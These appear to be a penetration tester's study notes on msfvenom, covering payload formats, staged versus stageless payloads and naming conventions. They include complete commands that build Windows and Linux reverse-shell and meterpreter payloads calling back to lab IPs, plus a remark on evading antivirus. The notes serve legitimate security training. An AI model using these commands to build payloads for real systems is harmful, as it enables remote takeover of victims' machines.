# msfvenom

Used to generate code primarily for reverse and bind shells. Can be used to generate payloads in various formats:

`.exe`
`aspx`
`.war`
`.py`

Standard syntax:

`msfvenom -p <PAYLOAD> <OPTIONS>`

Example: generate a Windows x64 Reverse Shell in exe:

`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listener-IP> LPORT=<listen-port>`

- `-f` specifies the output format
- `-o` output location and filename for the generated payload
- `LHOST=` specifies the IP to connect
- `LPORT=` port on local machine to connect back to

---

## Staged vs Stageless

### Staged
- Sent in __two__ parts
1. _stager_
	- A piece of code that executes directly ont he server itself
	- connects back to a waiting listener
	- __doesn't__ contain a reverse shell code
	- connects back to the listener and uses connection to load real payload
	- prevents it from touching the disk and being caught by traditional anti-virus solutions
2. Reverse shell code

### Stageless

Entirely self-contained. One piece of code which, when executed, sends a shell back immediately to the listener

---

## Payload Naming Convention

`<OS>/<arch>/<payload>`

`linux/x86/shell_reverse_tcp`

- Would generate a stageless reverse shell for an x86 Linux target

the __exception__ is for Windows 32bit targets; no arch is specified:

`windows/shell_reverse_tcp`

---

`msfvenom --list payloads`

---

reverse shell, Windows 64 bit .exe

`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=10.10.214.205 LPORT=5555`

staged meterpreter reverse shell for 64bit Linux target, elf

`msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443`


